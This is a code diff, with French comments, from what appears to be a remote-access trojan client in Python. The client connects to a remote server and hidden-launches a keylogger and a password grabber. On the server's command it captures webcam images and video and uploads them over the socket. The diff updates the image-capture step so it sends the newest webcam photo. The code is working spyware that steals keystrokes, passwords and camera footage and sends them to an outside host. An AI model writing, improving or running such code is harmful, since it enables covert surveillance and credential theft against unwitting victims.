@@ -80,9 +80,19 @@ def handle_commands(client_socket):
 
             elif command == "capture_image":
                 subprocess.run([WEBCAM_EXE, "image"], check=True)
-                image_file = os.path.join(BASE_DIR, "captures", "webcam_capture.jpg")
-                if wait_for_file(image_file):
-                    send_file(client_socket, image_file, "webcam_capture")
+                capture_folder = os.path.join(BASE_DIR, "captures")
+
+                # Récupère le fichier image le plus récent
+                images = [os.path.join(capture_folder, f) for f in os.listdir(capture_folder) if f.startswith("webcam_capture_") and f.endswith(".jpg")]
+                if not images:
+                    print("Aucune image trouvée")
+                    return
+
+                latest_image = max(images, key=os.path.getctime)
+
+                if wait_for_file(latest_image):
+                    send_file(client_socket, latest_image, "webcam_capture")
+
 
             elif command == "capture_video":
                 subprocess.run([WEBCAM_EXE, "video"], check=True)
@@ -97,11 +107,9 @@ def main():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.connect((SERVER_IP, SERVER_PORT))
 
-        # Lancer le keylogger et le password grabber
         subprocess.Popen([KEYLOGGER_EXE], creationflags=subprocess.CREATE_NO_WINDOW)
         subprocess.run([PASSWORD_EXE], check=True)
 
-        # Gérer les commandes serveur
         handle_commands(s)
 
 if __name__ == "__main__":
